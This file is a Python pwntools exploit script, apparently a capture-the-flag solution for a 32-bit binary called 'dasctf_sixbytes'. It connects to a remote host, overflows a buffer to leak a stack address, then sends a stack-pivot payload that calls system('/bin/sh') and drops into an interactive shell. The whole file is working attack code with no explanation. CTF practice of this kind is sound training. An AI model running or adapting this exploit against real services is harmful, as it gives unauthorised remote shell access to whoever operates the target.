#from dasctf_sixbytes import *
#
# bss = 0x0804A040
#
# payload1 = b'a' * 0x28 + p32(bss)
from pwn import *

sys_addr = 0x080483E0

io = remote('123.60.135.228', 2116)
# io = process('./dasctf_sixbytes')
# gdb.attach(io)
# io = remote("192.168.170.128", 1234)
# io.recvuntil("connection")

# bss = 0x0804A040
io.send(b'a' * 0x2f + b'b')
# pause()
io.recvuntil(b'b')
bp_addr = u32(io.recv(4))
print(hex(bp_addr))
start_addr = bp_addr - 0x40
binsh_addr = start_addr + 0x10
leave_ret = 0x08048488

payload = b'aaaa' + p32(sys_addr) + p32(0xdeedbeef) + p32(binsh_addr) + b'/bin/sh\x00'
payload = payload.ljust(0x30, b'\x00')
payload += p32(start_addr)
payload += p32(leave_ret)

io.sendline(payload)

io.interactive()